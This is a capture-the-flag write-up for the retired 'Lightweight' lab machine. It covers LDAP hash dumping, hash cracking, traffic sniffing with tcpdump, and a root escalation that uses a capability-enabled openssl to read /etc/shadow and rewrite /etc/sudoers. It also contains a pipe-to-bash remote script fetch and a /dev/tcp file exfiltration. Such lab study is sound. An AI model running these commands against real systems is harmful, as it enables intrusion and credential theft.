# Lightweight

This is the write-up for the box Lightweight that got retired at the 11th May 2019.
My IP address was 10.10.14.23 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.119    lightweight.htb
```

## Enumeration

Starting with a Nmap scan:

```markdown
nmap -sC -sV -o nmap/lightweight.nmap 10.10.10.119
```

```markdown
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 19:97:59:9a:15:fd:d2:ac:bd:84:73:c4:29:e9:2b:73 (RSA)
|   256 88:58:a1:cf:38:cd:2e:15:1d:2c:7f:72:06:a3:57:67 (ECDSA)
|_  256 31:6c:c1:eb:3b:28:0f:ad:d5:79:72:8f:f5:b5:49:db (ED25519)
80/tcp  open  http    Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16)
|_http-title: Lightweight slider evaluation page - slendr
389/tcp open  ldap    OpenLDAP 2.2.X - 2.3.X
| ssl-cert: Subject: commonName=lightweight.htb
| Subject Alternative Name: DNS:lightweight.htb, DNS:localhost, DNS:localhost.localdomain
| Not valid before: 2018-06-09T13:32:51
|_Not valid after:  2019-06-09T13:32:51
|_ssl-date: TLS randomness does not represent time
```

## Checking LDAP (port 389)

Lets check if we have anonymous authentication with **ldapsearch**:
```markdown
ldapsearch -x -h 10.10.10.119
```

It gives us a response and we can specify the search scope as _base_:
```markdown
ldapsearch -x -h 10.10.10.119 -s base namingcontexts

#
dn:
namingContexts: dc=lightweight,dc=htb
```

Search through that branch:
```markdown
ldapsearch -x -h 10.10.10.119 -b 'dc=lightweight,dc=htb'
```

Now we dumped the information of this branch and there are two users:
```markdown
dn: uid=ldapuser1,ou=People,dc=lightweight,dc=htb
uid: ldapuser1
mail: ldapuser1@lightweight.htb
objectClass: shadowAccount
userPassword:: e2NyeXB0fSQ2JDNxeDBTRDl4JFE5eTFseVFhRktweHFrR3FLQWpMT1dkMzNOd2Roai5sNE16Vjd2VG5ma0UvZy9aLzdONVpiZEVRV2Z1cDJsU2RBU0ltSHRRRmg2ek1vNDFaQS4vNDQv

dn: uid=ldapuser2,ou=People,dc=lightweight,dc=htb
uid: ldapuser2
mail: ldapuser2@lightweight.htb
objectClass: shadowAccount
userPassword:: e2NyeXB0fSQ2JHhKeFBqVDBNJDFtOGtNMDBDSllDQWd6VDRxejhUUXd5R0ZRdmszYm9heW11QW1NWkNPZm0zT0E3T0t1bkxaWmxxeXRVcDJkdW41MDlPQkUyeHdYL1FFZmpkUlF6Z24x

userPassword:: e2NyeXB0fXg=
```

When decoding the hashes with Base64 we get the following output:
```markdown
ldauser1:
{crypt}$6$3qx0SD9x$Q9y1lyQaFKpxqkGqKAjLOWd33Nwdhj.l4MzV7vTnfkE/g/Z/7N5ZbdEQWfup2lSdASImHtQFh6zMo41ZA./44/

ldapuser2:
{crypt}$6$xJxPjT0M$1m8kM00CJYCAgzT4qz8TQwyGFQvk3boaymuAmMZCOfm3OA7OKunLZZlqytUp2dun509OBE2xwX/QEfjdRQzgn1

userPassword:
{crypt}x
```

The **$6$** indicates that this is **SHA512 encrypted** which can be found in the hashcat-example list and we can try to crack these hashes:
```markdown
hashcat -m 1800 hashes.txt /usr/share/wordlists/rockyou.txt
```

This won't crack the hashes unfortunately.

## Checking HTTP (Port 80)

On the web page we get the information that it is protected against brute-forcing.
The _/user.php_ tells us that the server lets us get in with SSH:
> This server lets you get in with ssh. Your IP (10.10.14.23) is automatically added as userid and password within a minute of your first http page request. We strongly suggest you to change your password as soon as you get in the box.

## Checking SSH (Port 22)

As the web server told us, we can SSH into the box:
```markdown
ssh 10.10.14.23@10.10.10.19
```

The password is the same as our IP and we are logged in on the box.

Lets execute the enumeration script **LinEnum.sh** on this box to get more information about it.
```markdown
curl 10.10.14.23/LinEnum.sh | bash
```

Interestingly our user has the **POSIX capability** to execute the command _tcpdump_ as root which means we don't have command execution but have the permission to sniff traffic. Additionally we know the name of the network interface we will need for this procedure.
```markdown
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+ep
```

### Sniffing traffic

We will use _tcpdump_ with SSH so we won't write anything to the disk itself:
```markdown
ssh 10.10.14.23@10.10.10.119 "/usr/sbin/tcpdump -i ens33 -U -s0 -w - 'not port 22'" > lightweight.ens33.cap
```

Now we can run Wireshark with the capture file:
```markdown
wireshark lightweight.ens33.cap
```

While that runs we can sniff the live traffic on the _localhost_ interface:
```markdown
ssh 10.10.14.23@10.10.10.119 "/usr/sbin/tcpdump -i lo -U -s0 -w - 'not port 22'" | wireshark -k -i -
```

If we refresh all the pages on the web server we get some information on the localhost interface of the box:

![Wireshark on localhost](https://kyuu-ji.github.io/htb-write-up/lightweight/lightweight_wireshark-1.png)

When following the LDAP request, we see that _ldapuser2_ authenticates on the box with a password:

![Wireshark on localhost](https://kyuu-ji.github.io/htb-write-up/lightweight/lightweight_wireshark-2.png)

Password of _ldapuser2_:
> 8bc8251332abe1d7f105d3e53ad39ac2

Trying this password to change to the user:
```markdown
su - ldapuser2
```

The password works and we are authenticated as _ldapuser2_!

## Privilege Escalation

In the home directory of this user is a file called _backup.7z_ that we download to our local box.
```markdown
# On local machine:
nc -lvnp 9001 > backup.7z

# On the box:
cat backup.7z > /dev/tcp/10.10.14.23/9001
```

Decompress the 7z file:
```markdown
7z x backup.7z
```

This file wants a password so we extract the hash.
```markdown
./7z2john.pl backup.7z
```

This will output a long string that we can try to crack with **Hashcat**.
```markdown
hashcat -m 11600 backup.hash /usr/share/wordlists/rockyou.txt
```

After a while Hashcat cracked it and the password for the 7z file is:
> delete

In this archive we find the PHP source code of the web page.
The file _status.php_ has the password of _ldapuser1_ in clear-text:
> f3ca9d298a553da117442deeb6fa932d

### Privilege Escalation to root

Now we can authenticate with both users and should escalate our privileges to root with the user _ldapuser1_.
In his home directory we find these files:
- ldapTLS.php
- capture.pcap
- openssl

When looking at the capabilities of this user we see that he has the same as ours for _tcpdump_ but he got different ones for **openssl**:
```markdown
getcap *

# Output
openssl =ep
tcpdump = cap_net_admin,cap_net_raw+ep
```

If we look at the `man capabilities` we can read the following:
> Note that one can assign empty capability sets to a program file, and thus it is possible to create a set-user-ID-root program that changes the effective and saved set-user-ID of the process that executes the program to 0, but confers no capabilities to that process.

This is the case for `openssl` so we are going to look at **GTFObins** to find a way to exploit this.
We can test the _File read_ one by reading the Shadows file which normally could only be read by root:
```markdown
./openssl enc -in /etc/shadow
```

It is important to use the `openssl` binary in the home folder of the user and it works.
So we can read the contents of **/etc/sudoers**, put it into a new file with sudo permissions for this user and write it back with `openssl`.
```markdown
# Write output to new file
./openssl enc -in /etc/sudoers > sudoers

# Add permissions in the new file
root            ALL=(ALL)       ALL
ldapuser1       ALL=(ALL)       ALL

# Replace old sudoers file with new one
cat ./sudoers | ./openssl enc -out /etc/sudoers
```

Now we can `sudo -l` with _ldapuser1_ and see that we have root permissions. With `sudo su -` we can become root!
